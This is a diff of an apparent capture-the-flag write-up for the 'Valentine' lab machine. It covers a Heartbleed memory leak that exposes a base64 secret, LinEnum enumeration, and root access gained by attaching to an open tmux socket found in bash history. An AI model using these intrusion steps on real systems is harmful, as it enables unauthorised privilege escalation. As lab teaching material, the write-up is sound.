@@ -66,7 +66,7 @@ First I go see the web ports :
 
 We have this image on both web ports, this is a women screaming and a heart which is bleeding. The bleeding heart + port 443 open, it reminds me of an exploit named "heartbleed" ! 
 
-EXPLAIN HEARTBLEED !
+Explanation about heartbleed : [https://heartbleed.com/](https://heartbleed.com/)
 
 Before digging in to the heartbleed exploit, I launch a files/directories brute force :
 
@@ -227,7 +227,7 @@ Received heartbeat response:
   0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 29  mV0aGVoeXBlCg==)
 ```
 
-It seems to work, I can see a variable named text which looks like base64 :
+It seems to work, I can see a variable, named text which looks like base64 :
 
 ```
 $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
@@ -308,7 +308,41 @@ Launch the script :
 bash LinEnum.sh | tee results.txt
 ```
 
+Reading throught the results, there is one thing that stands out :
 
+```
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/hype/.bash_history
+
+exit
+exot
+exit
+ls -la
+cd /
+ls -la
+cd .devs
+ls -la
+tmux -L dev_sess 
+tmux a -t dev_sess 
+tmux --help
+tmux -S /.devs/dev_sess 
+exit
+```
+
+There might be a tmux session as dev still open ! Let's try to reconnect to it :
+
+```
+tmux -S /.devs/dev_sess
+```
+
+And there I have a shell as root :
+
+```
+root@Valentine:/home/hype# whoami
+root
+```
+
+Now I can read the flags !
 
 ## Flags
 
